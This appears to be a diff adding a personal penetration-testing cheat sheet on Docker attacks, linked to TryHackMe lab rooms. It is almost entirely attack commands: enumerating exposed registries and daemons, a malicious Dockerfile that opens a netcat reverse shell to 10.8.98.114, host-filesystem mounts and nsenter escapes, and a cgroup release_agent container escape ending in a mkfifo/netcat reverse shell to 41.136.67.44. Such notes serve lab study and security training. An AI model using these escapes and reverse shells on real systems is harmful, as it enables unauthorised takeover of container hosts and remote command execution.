@@ -1,0 +1,119 @@
+############
+## docker ##
+############
+## links
+# https://tryhackme.com/room/dockerrodeo
+# https://tryhackme.com/r/room/containervulnerabilitiesDG
+
+
+## are we in a container ?
+ps aux									# is there only few process ?
+ls -Al /								# is there .dockerenv file ?
+cat /proc/1/cgroup							# is there path with "docker" ?
+
+
+## docker registry
+# https://docs.docker.com/registry/spec/api/
+# nmap
+5000/tcp open  http    syn-ack Docker Registry (API: 2.0)
+7000/tcp open  http    syn-ack Docker Registry (API: 2.0)
+curl http://$h:5000/v2/_catalog						# curl repositories
+curl http://$h:5000/v2/REPOSITORY/NAME/tags/list			# curl tag list from 1 repo
+curl http://$h:5000/v2/REPOSITORY/NAME/manifests/TAG			# curl manifest from 1 tag
+
+
+## reverse docker images
+# config for download
+/etc/docker/daemon.json
+{ "insecure-registries" : ["$h:5000"] }
+sudo systemctl stop docker && sleep 60 && sudo systemctl start docker
+# if possible download image if registry is opened
+docker pull $h:5000/dive/example					# download docker image
+docker images								# check image ID
+dive IMAGE_ID								# dive 398736241322
+
+
+## upload malicious docker image
+# Dockerfile
+FROM debian:jessie-slim
+RUN apt-get update -y
+RUN apt-get install netcat -y
+RUN nc -e /bin/sh 10.8.98.114 4444
+# docker build
+docker build
+
+
+## exposed docker daemon
+# nmap
+2375/tcp open  docker  syn-ack Docker 19.03.13 (API 1.40)
+# docker command
+curl http://$h:2375/version							# curl version
+docker -H tcp://$h:2375 ps							# running container
+docker -H tcp://$h:2375 network ls						# list network of containers
+docker -H tcp://$h:2375 images							# list images used
+docker -H tcp://$h:2375 exec -it CONTAINER_ID /bin/sh				# exec command into container
+docker -H $h:2375 run --rm -it --privileged --net=host -v /:/mnt alpine		# mount host inside a container
+docker -H $h:2375 run --rm -it --privileged --net=host -v /:/mnt alpine:3.9	# specific tag 3.9
+
+
+## docker rights
+sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+     docker run -v /:/mnt --rm -it image
+
+
+## shared namespaces
+# every new container will be running as a new namespace
+# be root on pwned container and ps aux, usually just few process, if many container is connected to host namespace
+# nsenter == namespace enter
+ps aux
+nsenter --target 1 --mount sh					# target PID 1 /sbin/init
+nsenter --target 1 --mount --uts --ipc --net /bin/bash		# uts:same hostname, ipc:mem shared, net:network
+
+
+## bad permission / privilegied container
+# Exemple on the host
+docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
+# In the container, check cap
+capsh --print | grep sys_admin						# check if we got cap_sys_admin
+fdisk -l								# list disk
+mount /dev/sda1 /mnt/							# access all host files
+# OR Escalate by using mount syscall
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+echo '#!/bin/sh' > /cmd
+echo "ps aux > $host_path/output" >> /cmd
+chmod a+x /cmd
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+cat /output								# get outputs of "ps aux" cmd
+
+echo '#!/bin/sh' > /cmd
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 41.136.67.44 4444 >/tmp/f" >> /cmd
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"				# get rshell
+
+
+## exposed socket
+find / -name docker.sock 2>/dev/null					# search socket
+find / -iname "*.sock" 2>/dev/null					# search socket
+ls -Al /var/run | grep sock						# search socket
+docker images								# list images
+docker run -it -v /:/host/ ubuntu chroot /host/ bash			# run one with host disk
+docker run -it -v /:/mnt   alpine chroot /mnt   sh			# other example
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
